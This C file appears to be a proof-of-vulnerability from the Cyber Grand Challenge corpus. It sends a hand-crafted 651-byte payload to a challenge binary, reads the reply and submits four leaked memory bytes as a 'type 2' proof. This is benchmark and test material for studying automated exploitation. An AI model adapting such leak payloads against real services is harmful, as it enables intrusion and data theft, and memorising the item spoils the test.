#include "libpov.h"

int main(int cgc_argc, char *cgc_argv[]) {
    cgc_negotiate_type2();

    int i;
    unsigned char out[8192];
    unsigned int challenge[2];
    unsigned char *c = (unsigned char *) &challenge;

    char *key = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
    char *exploit = "\x04\x04\x00\x00\x1C\x44\x83\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x08\x50\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x08\x64\x76\x00\x98\x33\xAA\xC2\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x08\x42\x10\x84\x21\x00";
    cgc_transmit_all(STDOUT, "2\n", 2);
    cgc_transmit_all(STDOUT, key, 95);
    cgc_transmit_all(STDOUT, "651\n", 4);
    cgc_transmit_all(STDOUT, exploit, 651);

    cgc_length_read(STDIN, out, 0x40);
    if (out[0x3e] == 'e' && out[0x3f] == 'r')
        cgc_transmit_all(STDOUT, "3\n", 2);
    else
        cgc_length_read(STDIN, out, 580);

    cgc_assign_from_slice("TYPE2_VALUE", out + 576, 4, 0, 0, 1);
    cgc_submit_type2("TYPE2_VALUE");

    return 0;
}
